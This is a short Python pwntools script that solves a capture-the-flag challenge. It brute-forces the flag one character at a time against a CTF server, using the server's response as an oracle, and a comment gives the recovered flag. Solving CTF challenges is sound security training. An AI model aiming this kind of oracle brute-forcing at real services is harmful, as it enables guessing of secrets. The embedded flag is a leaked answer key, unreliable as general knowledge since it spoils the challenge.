from pwn import *
from string import (
    ascii_lowercase as low,
    ascii_uppercase as up,
    punctuation as punc,
    digits as dig,
)
printable = '_' +dig + punc +low
win=b'  ____                         _                                       _ \n'
lose=b'__        __                                                             ____  \n'

payload=b'ISICTF{'
while True:
    for c in printable:
        p=remote("challenges.isictf.live",1107)
        payloadTest=payload+c.encode()
        p.recvuntil(b"flag: \n")
        p.sendline(payloadTest)
        result=p.recvline()
        if result==win:
            print("the right one",payloadTest)
            payload=payloadTest
            p.close()
            break
    if payload.decode().endswith('}'):
        break
print("\ncongrats here is the flag :  ",payload)
        

#flag=b'ISICTF{71me_4tt4ck_15_4m4z1ng}'



